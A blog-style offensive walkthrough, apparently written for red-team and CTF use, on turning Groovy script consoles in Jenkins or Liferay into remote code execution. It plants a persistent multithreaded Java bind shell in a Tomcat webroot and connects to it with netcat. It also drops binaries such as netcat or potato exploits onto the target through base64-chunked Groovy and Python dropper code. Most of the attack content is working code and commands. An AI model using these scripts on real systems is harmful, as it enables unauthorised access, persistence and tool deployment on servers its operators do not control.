---
title: "DevOops: Script Consoles"
date: 2025-10-22
slug: devops-rce
tags:
  - bind shell
  - groovy
  - devops
  - liferay
  - jenkins
  - RCE
description: "A practical walkthrough of abusing Groovy script consoles in DevOps environments to write persistent java bind shells, with techniques for transferring tools (base64) programmatically, persistence, and post-exploitation tailored for tight scenarios where outgoing network access is blocked by firewalls."
---

![Liferay Jenkins exploitation banner](../images/banner33.png)

# \_\_OVERVIEW

Have you ever been in an engagement or CTF where you finally find a Groovy script console… and then discover that outbound connections are blocked? Or you have a basic shell but you just can't get tools to the target using built-in upload methods?

Over the next few minutes I'll show a practical, repeatable approach for turning a Groovy console into a persistent, multithreaded java bind shell that lives in the webroot and how to transfer binary tools via base64 encoding (small and large size). This guide serves as a proof of concept; the shell in here is not secure enough for opsec, but it's a starting point for you to build upon.

<!-- more -->

### Quick Refresher on Bind Shells:

![shelltypes](../images/shelltypes.png)
The top side shows a bind shell: the victim host runs a listener (a shell bound to a TCP port) and the attacker connects into that listener to gain interactive access. The bottom side shows a reverse shell: the attacker runs the listener and the victim initiates an outbound connection back to the attacker, delivering a shell to the attacker's listener.

Reverse shells are the go-to for many red-teamers because they slip out through egress and work around NAT. But when outgoing traffic is tightly restricted (egress-blocked/proxied), you need a plan B. That's when bind shells become essential. In short: a bind shell makes the target listen and waits for an inbound connection. It trades the egress dependency of a reverse shell for a requirement that you can reach the host inbound (or via a pivot you control). That trade can be exactly what you need when defenders have locked down outbound channels.

---

### Groovy Console to Bind Shell:

![Google Script Console showing Groovy code execution](../images/gsc.png)
When your RCE is limited to a Groovy-style script console (in tools such as Jenkins, Liferay, etc.) and the target cannot reach back to you, the console itself becomes your primary file system and transfer channel. This post focuses on turning that console access into a stable way to read/write files and drop tools. Treat the console like a tiny development environment on the target: you can list folders, create files, and write binary blobs (via base64) into disk locations the web server will execute or serve.

---

## Exploitation Methodology

### High-Level Steps:

1. Initial reconnaissance: Run simple OS commands to identify the environment and locate the webroot.
2. Discover writable paths: Find locations where you can save files that persist and potentially get executed or served.
3. Deploy the bind shell: Write a persistent java bind shell to the webroot.
4. Transfer tools: Use base64 encoding to transfer binary tools (if needed).
5. Verify and connect: Test the bind shell and establish a connection.
6. Clean up: Document detection artifacts and remove traces when done.

## Step 1: Initial Reconnaissance

### Simple OS Commands POC

Proof-of-concept script for running simple commands such as `pwd`, `ls`, `dir`, `cd` to navigate the file system and identify where the Apache web root lives, so the bind shell you write can be accessed through a URL like `https://SITE/bindshell`.

1. Commands:

```terminal
For Linux:
pwd, ls -la, id, whoami, env

For Windows:
dir, whoami, echo %USERPROFILE%
```

The full groovy script would look like this:

```groovy
def cmd="YOURCOMMAND-dir"
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

## Step 2: Finding Stable, Writable Locations

From the console, run simple listing commands to map the file system and locate likely writable paths.

Typical candidate locations:

- Application webroot (e.g., `<TOMCAT_HOME>/webapps/ROOT`)

files here can often be triggered by HTTP requests.

Tips:

- Check file ownership and mode (`ls -la`) to avoid placing files you can't later run or overwrite.
- If multiple app instances exist (e.g., separate webapps), target the one whose webroot is public-facing.

---

## Step 3: Deploying the Bind Shell

In this step, you use a Groovy script that embeds a Java-based bind shell.

Use this link to access the script:
[https://github.com/vipa0z/groovy-rce-bindshell](https://github.com/vipa0z/groovy-rce-bindshell)

The script performs two main steps:

1. Saves a java bind shell to the specified location.
2. Activates the listener once you access the java through a URL.

Update the output path in the script to match your Tomcat webroot and modify the port the shell should listen on, then paste the script into your console and run it.

Hit save, then to enable the listener, browse to your web shell at: `http://site/bindshell.java`

Connect to the bind shell via netcat:

```
Example 1:
rlwrap -cAr nc -nv HOST-IP 3001

Example 2:
rlwrap -cAr nc -nv 172.16.30.10 3001
```

**Note on why multithreading was used:** With many bind shells, it’s easy to accidentally kill the session (for example, by hitting `Ctrl+C`). In early versions of this shell, once the client disconnected, reconnecting with netcat wasn’t reliable. To fix that, the java handler accepts new connections in separate threads so a disconnect doesn’t permanently “break” the listener.

## Script Console as a dropper

We can use the script console for dropping tools on the file system by first base64-encoding them and then running a script to decode that data into a local file on the target.
Depending on the target environment, some console versions only support string variables that are around 6000 characters in length, which requires a bit of improvisation on our side.

### Method 1: Dropping smaller sized tools (e.g., netcat, potato exploits, etc.)

Base64 encode the tool and copy to clipboard:

```
base64 --wrap=0 <tool.exe> | xclip -selection clipboard -i
```

Paste the encoded blob into the b64 variable:

```groovy
import java.util.Base64
import java.nio.file.Files
import java.nio.file.Paths
import java.nio.charset.StandardCharsets

def b64 = '''<LONG BASE64 STRING>'''
def dest = Paths.get("C:/DESTPATH/xyz")
byte[] bytes = Base64.getDecoder().decode(b64)
Files.write(dest, bytes)
println "Wrote ${bytes.length} bytes to ${dest}"
```

**Note:** This will not work if your base64 string is more than 6000 characters in length; you can use Method 2 below instead.

### Dropping Larger Binaries

Update: I wrote a dropper generator that creates script console code to drop tools, you can find it here: https://github.com/vipa0z/B64Dropper

example:
generating dropper code for netcat:
![generating groovy script with bas64 chunks of netcat](../images/dropper.gif)

If you want to continue with the semi-manual method below:

the following is a script that chunks your tools into smaller base64 files, each containing a base64 String variable that is 6000 characters in length, so you can paste them into the console and reassemble them with Groovy.

```python
#!/usr/bin/env python3
import os
import base64
import argparse
from pathlib import Path

def chunk_base64_file(input_file, output_dir, chunk_size):
    """Convert a binary file to base64 and split it into chunks."""
    with open(input_file, "rb") as f:
        b64_data = base64.b64encode(f.read()).decode()

    os.makedirs(output_dir, exist_ok=True)

    parts = []
    for i in range(0, len(b64_data), chunk_size):
        chunk = b64_data[i:i + chunk_size]
        part_name = f"part{i // chunk_size + 1}.txt"
        part_path = Path(output_dir) / part_name
        with open(part_path, "w") as out:
            out.write(chunk)
        parts.append(part_name)

    return parts, len(b64_data)


def main():
    parser = argparse.ArgumentParser(
        description="Convert a binary file to base64 and split it into chunk files."
    )
    parser.add_argument("input_file", help="Path to the input binary file (e.g., tool.exe)")
    parser.add_argument("-o", "--output-dir", default="output_chunks", help="Output directory for chunks")
    parser.add_argument(
        "-s", "--chunk-size",
        type=int,
        default=50000,
        help="Length of each chunk string (default: 50000)"
    )
    args = parser.parse_args()

    parts, total_length = chunk_base64_file(args.input_file, args.output_dir, args.chunk_size)

    abs_dir = os.path.abspath(args.output_dir)
    print(f"[+] chunks generated, saved in: {abs_dir}\n")
    print("[+] use the following command to copy all chunks to clipboard:")
    print(f"cat {args.output_dir}/* | xclip -selection clipboard -i\n")
    print("[+] paste the contents of your clipboard into the script console, then add this and edit the path:\n")

    joined_parts = ", ".join(parts)
    java_snippet = f"""import java.util.Base64;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.charset.StandardCharsets;

def allParts = [
    {joined_parts}
].join('');

println "Total base64 length: ${{allParts.length()}}";

def dest = Paths.get("C:/Users/<username>/Desktop/file.exe");
byte[] bytes = Base64.getDecoder().decode(allParts);
Files.write(dest, bytes);
println "Wrote ${{bytes.length}} bytes to ${{dest}}";
"""

    print(java_snippet)


if __name__ == "__main__":
    main()

```

Run:

```
python3 tool_chunker.py yourtool.exe -o <output_dir> -s 6000
```

**Options:**

- `-s`: chunk size (default 6000)
- `-o`: output directory
- `-h`: help

The script outputs numbered chunks (`part1`, `part2`, etc.) and shows you what to do next.

**Example:**

```
python3 tool_chunker.py -s 6000 XecretsEz -o xcretsez
```

<img width="819" height="261" alt="image" src="https://github.com/user-attachments/assets/f5e1bf7f-6916-4ca2-bdf5-de0d7caa424b" />

Steps:

1. Run the script as shown above
2. Paste into the script console
3. Copy the Groovy reassembly code from the script output and paste it below your base64 blobs
4. Double-check the write path is correct
5. Save and run

---

## Verification

After dropping the file, sanity check it:

- Compare file size
- Hash it (MD5/SHA256) and compare with the original

---

## Step 6: Cleanup and Detection Artifacts

That's it! Quick recap: find writable paths, use base64 (chunked if needed), verify integrity, and clean up your artifacts when done.
